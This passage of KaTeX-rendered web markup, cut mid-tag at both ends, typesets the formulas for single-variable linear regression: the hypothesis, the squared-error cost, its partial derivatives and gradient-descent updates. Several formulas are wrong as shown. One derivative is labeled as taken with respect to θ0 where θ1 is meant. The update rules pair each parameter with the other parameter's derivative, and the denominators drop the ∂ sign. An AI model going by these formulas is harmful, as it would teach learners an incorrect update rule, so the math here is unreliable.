class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><msub><mi>θ</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>θ</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>m</mi></mrow></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">J(\theta_0,\theta_1)=\frac{1}{2m}\sum^{m}_{i=1}(h_\theta{(x_i)}-y_i)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathdefault">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>J</mi><mo stretchy="false">(</mo><msub><mi>θ</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>θ</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>θ</mi><mn>0</mn></msub></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{\partial J(\theta_0,\theta_1)}{\partial\theta_0}=\frac{1}{m}\sum_{i=1}^{m}(h_\theta(x_i)-y_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.263em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>J</mi><mo stretchy="false">(</mo><msub><mi>θ</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>θ</mi><mn>0</mn></msub></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\frac{\partial J(\theta_1)}{\partial\theta_0}=\frac{1}{m}\sum_{i=1}^{m}(h_\theta(x_i)-y_i)\times x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.263em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>θ</mi><mn>1</mn></msub><mo>:</mo><mo>=</mo><msub><mi>θ</mi><mn>1</mn></msub><mo>−</mo><mi>α</mi><mo>×</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>J</mi><mo stretchy="false">(</mo><msub><mi>θ</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>θ</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><msub><mi>θ</mi><mn>0</mn></msub></mfrac><mtext>  </mtext><msub><mi>θ</mi><mn>0</mn></msub><mo>:</mo><mo>=</mo><msub><mi>θ</mi><mn>0</mn></msub><mo>−</mo><mi>α</mi><mo>×</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>J</mi><mo stretchy="false">(</mo><msub><mi>θ</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>θ</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><msub><mi>θ</mi><mn>1</mn></msub></mfrac></mrow><annotation encoding="application/x-tex">\theta_1:=\theta_1-\alpha\times\frac{\partial J(\theta_0,\theta_1)}{\theta_0} \; \theta_0:=\theta_0-\alpha\times\frac{\partial J(\theta_0,\theta_1)}{\theta_1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.263em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.263em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" 